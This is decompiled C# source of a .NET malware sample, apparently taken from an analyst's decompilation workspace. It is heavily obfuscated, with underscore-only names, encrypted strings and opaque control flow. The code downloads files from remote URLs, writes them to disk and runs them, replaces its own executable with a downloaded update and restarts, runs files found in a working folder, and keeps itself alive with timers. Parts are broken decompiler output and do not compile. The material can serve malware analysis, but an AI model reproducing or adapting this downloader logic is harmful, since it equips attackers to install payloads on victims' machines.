using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Timers;

[StandardModule]
internal sealed class ______________________
{
	public static string _;

	public static string __;

	public static string ___;

	public static string ____;

	public static string _____;

	private static string ______;

	public static int _______;

	public static void _()
	{
		// 
		// Current member / type: System.Void ______________________::_()
		// File path: C:\Users\george.bungarzescu\Desktop\virus\dot_peack_decompiled\VirusDecompiler\bin\Debug\HuuGhrjxjVBDecoded.hex-cleaned.dll
		// 
		// Product version: 2016.1.112.1
		// Exception in: System.Void _()
		// 
		// Object reference not set to an instance of an object.
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 112
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\BaseDominatorTreeBuilder.cs:line 26
		//    at ..BuildTree( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DTree\FastDominatorTreeBuilder.cs:line 25
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\DominatorTreeDependentStep.cs:line 18
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 68
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 59
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..( ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\Loops\LoopBuilder.cs:line 56
		//    at ..() in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 128
		//    at ..( ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\LogicFlow\LogicalFlowBuilderStep.cs:line 51
		//    at ..(MethodBody ,  , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 88
		//    at ..(MethodBody , ILanguage ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\DecompilationPipeline.cs:line 70
		//    at ..( , ILanguage , MethodBody , & ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 99
		//    at ..(MethodBody , ILanguage , & ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\Extensions.cs:line 62
		//    at ..(ILanguage , MethodDefinition ,  ) in c:\Builds\245\Behemoth\ReleaseBranch Production Build\Sources\OpenSource\Cecil.Decompiler\Decompiler\WriterContextServices\BaseWriterContextService.cs:line 116
		// 
		// mailto: JustDecompilePublicFeedback@telerik.com

	}

	public static void __()
	{
		int num = 0;
		int num1 = 0;
		try
		{
			______________________._();
			int num2 = 13337;
			try
			{
				num2 = Convert.ToInt32(______________________________________________________________._______________________);
			}
			catch (Exception exception)
			{
				ProjectData.SetProjectError(exception);
				num2 = 133337;
				ProjectData.ClearProjectError();
			}
			if ((16 * num + 16 * num ^ 477) != -3541)
			{
				______________________._ = string.Concat(______________________.______, ______________________________________________________________._______________________, <Module>.___<string>(-675643736));
				num = num2 - 100;
				______________________.__ = string.Concat(______________________.______, num.ToString(), <Module>.___<string>(-675643736));
				num1 = 8344;
			}
			num = num2 - 99;
			______________________.___ = string.Concat(______________________._, num.ToString(), <Module>._____<string>(305124521));
			int num3 = num1;
			num1 = -4685;
			if (num3 == 8344)
			{
				num = num2 - 98;
				______________________._____ = string.Concat(______________________._, num.ToString(), <Module>.___<string>(-675643736));
				num1 == 29001;
			}
			num = num2 - 97;
			______________________.____ = string.Concat(______________________._, num.ToString(), <Module>.____<string>(-2143068903));
			______________________.___(______________________._);
			______________________.___(______________________.__);
			______________________.___(______________________.___);
			______________________.___(______________________._____);
			______________________.___(______________________.____);
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			ProjectData.ClearProjectError();
		}
	}

	public static void ___(string string_0)
	{
		try
		{
			if (!Directory.Exists(string_0))
			{
				Directory.CreateDirectory(string_0);
			}
			_____________________________________________________________________________._______________(string_0);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void ____(string string_0)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = string_0;
			process.Start();
			______________________________________________________________________________._____(process.Id);
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____()
	{
		string str = null;
		int num = 0;
		int num1 = 0;
		object length;
		_____________________________________________________________________________.________________(______________________.____);
		try
		{
			string[] files = Directory.GetFiles(______________________.____);
			int num2 = 0;
			while (num2 < checked((int)files.Length))
			{
				string str1 = files[num2];
				try
				{
					_____________________________________________________________________________._________________(str1);
					if (str1.Contains(<Module>.___<string>(-1119421283)))
					{
						switch (Type.EmptyTypes.Length)
						{
							default:
							{
								______________________.____(str1);
								break;
							}
						}
					}
					else if (str1.Contains(<Module>.___<string>(-1582709149)))
					{
						Process.Start(str1);
					}
					else if (str1.Contains(<Module>.____<string>(-1361436802)) | str1.Contains(<Module>.___<string>(1300805583)))
					{
						_______________________________________________________________________.___________(_____________________________________________________________________________.__, string.Empty, File.ReadAllBytes(str1), true, true, false);
					}
				}
				catch (Exception exception)
				{
					ProjectData.SetProjectError(exception);
					ProjectData.ClearProjectError();
				}
				if ((num2 << 20) + 5009 + 483840 != ~(1073741824 * num2) >> 17)
				{
					num2++;
				}
				else
				{
					goto Label0;
				}
			}
			str = string.Concat(______________________.____, <Module>.______<string>(-40396910));
			if ((num % 117 - -9776 & -4608) == 9728)
			{
				length = Type.EmptyTypes.Length + 1;
			}
			else if ((6273 ^ -(104 * num + 24 * num)) == 0)
			{
				length = sizeof(Guid) + 1922351617;
			}
			else
			{
				if (num1 * 820 + num1 * 204 != 7798)
				{
					goto Label1;
				}
				length = Type.EmptyTypes.Length + 427251172;
			}
		Label2:
			switch (length)
			{
				case 0:
				{
					break;
				}
				default:
				{
					goto Label1;
				}
			}
		Label0:
			FileSystem.FileOpen(2, str, OpenMode.Input, OpenAccess.Default, OpenShare.LockReadWrite, -1);
			System.Timers.Timer timer = new System.Timers.Timer();
			timer.Elapsed += new ElapsedEventHandler(______________________.___________);
			timer.Interval = 50000;
			timer.Start();
			Thread.Sleep(-1);
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			ProjectData.ClearProjectError();
		}
		return;
	Label1:
		if (File.Exists(str))
		{
			goto Label0;
		}
		_____________________________________________________________________________._______________(______________________.____);
		File.WriteAllText(str, string.Empty);
		length = sizeof(byte) + -1;
		goto Label2;
	}

	public static void ______()
	{
		try
		{
			string str = <Module>.___<string>(534469697);
			string[] files = Directory.GetFiles(______________________.____);
			for (int i = 0; i < checked((int)files.Length); i++)
			{
				string str1 = files[i];
				try
				{
					string fileName = Path.GetFileName(str1);
					if (Operators.CompareString(fileName, <Module>._____<string>(-693427233), false) != 0 && !fileName.Contains(______________________________________________________________._______________________))
					{
						str = string.Concat(str, fileName, <Module>._______<string>(1693661660));
					}
				}
				catch (Exception exception)
				{
					ProjectData.SetProjectError(exception);
					ProjectData.ClearProjectError();
				}
			}
			if (str.Contains(<Module>.______<string>(-275284499)))
			{
				______________________________________________________________.______________(<Module>.______<string>(2043928306), str);
			}
			else
			{
				______________________________________________________________.______________(<Module>.____<string>(-899364305), <Module>.___<string>(1945922261));
			}
		}
		catch (Exception exception2)
		{
			ProjectData.SetProjectError(exception2);
			Exception exception1 = exception2;
			______________________________________________________________.______________(<Module>.____<string>(1187660804), string.Concat(<Module>.___<string>(-1320760414), exception1.ToString()));
			ProjectData.ClearProjectError();
		}
	}

	public static void _______()
	{
		_____________________________________________________________________________.________________(______________________.____);
	}

	public static void ________(string string_0)
	{
		try
		{
			string str = string.Concat(______________________.____, string_0);
			if (File.Exists(str))
			{
				switch (Type.EmptyTypes.Length)
				{
					default:
					{
						_____________________________________________________________________________._______________(______________________.____);
						_____________________________________________________________________________._______________(str);
						Thread.Sleep(1500);
						Random random = new Random();
						FileSystemProxy fileSystem = C.bzA.FileSystem;
						string tempPath = Path.GetTempPath();
						int num = random.Next(1000, 9000);
						fileSystem.MoveFile(str, string.Concat(tempPath, num.ToString()));
						______________________________________________________________.______________(<Module>.____<string>(-899364305), string.Concat(<Module>.___<string>(-2106606619), string_0));
						break;
					}
				}
			}
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>.______<string>(2043928306), string.Concat(<Module>.___<string>(1422024791), exception.ToString()));
			ProjectData.ClearProjectError();
		}
		_____________________________________________________________________________.________________(______________________.____);
	}

	public static void _________(string string_0, string string_1)
	{
		int num;
		int _______ = 0;
		int num1 = 0;
		int num2 = 0;
		int ________ = 0;
		int num3 = 0;
		int num4 = 0;
		int ________1 = 0;
		int num5;
		object length;
		int length1;
		try
		{
			string str = string.Concat(______________________.____, string_1);
			if (!File.Exists(str))
			{
				num = -31590;
				if (num3 * 927 + 1121 * num3 == -9147)
				{
					num2 = 1136733322;
					num5 = 1136733322;
				}
				else
				{
					num5 = checked((int)-21421);
				}
				if (num5 != -7780)
				{
					byte[] numArray = (new WebClient()).DownloadData(string_0);
					if (string_1.Contains(<Module>.______<string>(-1581933141)))
					{
						if (num == 28854)
						{
							________ = <Module>._______________;
							(________ % 22 / 647 ^ 1073742750) != 0;
						}
						string str1 = str;
						byte[] numArray1 = numArray;
						int length2 = Type.EmptyTypes.Length + 70811;
						int _________ = <Module>.________________;
						if (_________ / 251703 % 61002 != -2113251512)
						{
							int ______ = <Module>.___________;
							if (7980032 + ______ + ______ == ______ << 1)
							{
								length1 = (______ % 1024 == -1172936036 ? Type.EmptyTypes.Length + -1814645102 : Type.EmptyTypes.Length + 1732866803);
							}
							else
							{
								_______ = <Module>.C;
								length1 = (_______ + 5270 - 2083 == (_______ | 4226) ? 2100245301 : Type.EmptyTypes.Length + 248);
							}
						}
						else if ((-(_________ & 3272) | -3) != -3)
						{
							length1 = -403452942;
						}
						else if ((_________ % 4036271 ^ 8390091) == 0)
						{
							________1 = <Module>.______________;
							if (((________1 << 17) / 512 | -1979711534) == -1979711534)
							{
								num3 = ___________._;
								length1 = (int)(sizeof(long) + -1940606279);
							}
							else
							{
								length1 = ((5873 & 2097152 * ________1) != 0 ? Type.EmptyTypes.Length + -1441680308 : (int)(sizeof(Guid) + 510997079));
							}
						}
						else
						{
							length1 = Type.EmptyTypes.Length + -1062256191;
						}
						File.WriteAllBytes(str1, ___________________________________________________________________._______(numArray1, <Module>.__________(69943, length2, length1)));
						if ((~(_______ / 24460871) & 134221207) == 0)
						{
							goto Label1;
						}
						else if ((-3 | 2 * ________ + 6 * ________ - 800457277) != -1)
						{
							if ((-9937 | 111230976 * <Module>._______________) != -9937)
							{
								goto Label1;
							}
							length = Type.EmptyTypes.Length + 335456222;
						}
						else if ((num1 + num1 - -8244 ^ 7691) != 0)
						{
							length = Type.EmptyTypes.Length + 2;
						}
						else if ((~(-523283 | num2) * num2 & 1) == 0 || (~num2 & 64) == 64)
						{
							if (~(num3 * 2097152) == (6705 ^ num3 >> 30) >> 13)
							{
								goto Label3;
							}
							num4 = 1492554320;
							goto Label1;
						}
						else
						{
							length = Type.EmptyTypes.Length + -1909049785;
						}
					}
					else if (!string_1.Contains(<Module>.____<string>(1400700540)))
					{
						File.WriteAllBytes(str, numArray);
						______________________.____(str);
						______________________________________________________________.______________(<Module>.____<string>(-899364305), string.Concat(<Module>.____<string>(664719811), string_1));
						length = Type.EmptyTypes.Length + 3;
					}
					else
					{
						File.WriteAllBytes(str, numArray);
						if ((9504 & num4 / 12083 / 734276768) != 0)
						{
							length = Type.EmptyTypes.Length + 1705573932;
						}
						else if (________1 % 8388608 == -968465429)
						{
							length = Type.EmptyTypes.Length + -1963884205;
						}
						else if (-620756992 + num != num)
						{
							length = ((1073742019 ^ num3 / 9) != 0 ? checked((int)0) : Type.EmptyTypes.Length + 1671193448);
						}
						else
						{
							length = Type.EmptyTypes.Length + 1701880195;
						}
					}
				Label4:
					switch (length)
					{
						case 1:
						{
							break;
						}
						default:
						{
							goto Label1;
						}
					}
				}
				if (!_______________________________________________________________________.___________(_____________________________________________________________________________.__, string.Empty, File.ReadAllBytes(str), true, true, false))
				{
					______________________________________________________________.______________(<Module>._______<string>(-1937358506), string.Concat(<Module>.______<string>(989913392), string_1));
				}
				else
				{
					______________________________________________________________.______________(<Module>.____<string>(-899364305), string.Concat(<Module>.______<string>(-636488952), string_1));
				}
			}
		Label0:
		}
		catch (Exception exception1)
		{
			ProjectData.SetProjectError(exception1);
			Exception exception = exception1;
			______________________________________________________________.______________(<Module>._____<string>(-1723325216), string.Concat(<Module>.______<string>(-650305869), exception.ToString()));
			ProjectData.ClearProjectError();
		}
		return;
	Label1:
		if (string_1.Contains(<Module>._______<string>(1529344016)) | string_1.Contains(<Module>._______<string>(-645525906)))
		{
			goto Label0;
		}
		length = sizeof(short) + -1;
		goto Label4;
		if ((num * 524288 ^ 22562) == 0 || -(-2097152000 * num) == 1455)
		{
			length = Type.EmptyTypes.Length + 1685938017;
			goto Label4;
		}
		else if ((<Module>.___________ * -2046820352 - 6655 ^ 2946) != 0)
		{
			length = Type.EmptyTypes.Length + -1504313212;
			goto Label4;
		}
		else
		{
			int ____ = ______________________._______;
			if (~(____ / 1073741824) < 0 || (536878982 & (____ | ____)) != 0)
			{
				length = Type.EmptyTypes.Length + 1778078798;
				goto Label4;
			}
			else
			{
				length = Type.EmptyTypes.Length + 1903888396;
				goto Label4;
			}
		}
	}

	public static void __________(string string_0, bool bool_0, bool bool_1)
	{
		byte[] numArray;
		string empty = string.Empty;
		try
		{
			WebClient webClient = new WebClient();
			if (!_________________________________________________._________())
			{
				try
				{
					numArray = webClient.DownloadData(string_0);
				}
				catch (Exception exception1)
				{
					ProjectData.SetProjectError(exception1);
					Exception exception = exception1;
					______________________________________________________________.______________(<Module>.______<string>(-820038095), string.Concat(<Module>.______<string>(308955237), exception.ToString()));
					ProjectData.ClearProjectError();
					return;
				}
				_________________________________________________________________.__();
				_____________________________________________________________________________._______________(______________________.__);
				_____________________________________________________________________________._______________(_____________________________________________________________________________.__);
				if (bool_0)
				{
					try
					{
						if (Operators.CompareString(Convert.ToBase64String(File.ReadAllBytes(_____________________________________________________________________________.__)), Convert.ToBase64String(numArray), false) == 0)
						{
							return;
						}
					}
					catch (Exception exception2)
					{
						ProjectData.SetProjectError(exception2);
						ProjectData.ClearProjectError();
					}
				}
				Random random = new Random();
				if (File.Exists(_____________________________________________________________________________.__))
				{
					string tempPath = Path.GetTempPath();
					int num = random.Next(1000, 9000);
					empty = string.Concat(tempPath, num.ToString());
					C.bzA.FileSystem.MoveFile(_____________________________________________________________________________.__, empty);
				}
				File.WriteAllBytes(_____________________________________________________________________________.__, numArray);
				if (!bool_1)
				{
					______________________________________________________________.______________(<Module>._____<string>(1464211711), <Module>.______<string>(991878003));
				}
				else
				{
					______________________________________________________________.______________(<Module>.______<string>(2043928306), <Module>.______<string>(1282033260));
					Process.Start(_____________________________________________________________________________.__);
					ProjectData.EndApp();
				}
			}
			else
			{
				______________________________________________________________.______________(<Module>._______<string>(-1937358506), <Module>._____<string>(100257919));
			}
		}
		catch (Exception exception5)
		{
			ProjectData.SetProjectError(exception5);
			Exception exception3 = exception5;
			______________________________________________________________.______________(<Module>._____<string>(-1723325216), string.Concat(<Module>.______<string>(1283997871), exception3.ToString()));
			try
			{
				if (!File.Exists(_____________________________________________________________________________.__))
				{
					C.bzA.FileSystem.MoveFile(empty, _____________________________________________________________________________.__);
				}
			}
			catch (Exception exception4)
			{
				ProjectData.SetProjectError(exception4);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
	}

	[DebuggerStepThrough]
	private static void ___________(object sender, ElapsedEventArgs e)
	{
		______________________._______();
	}
}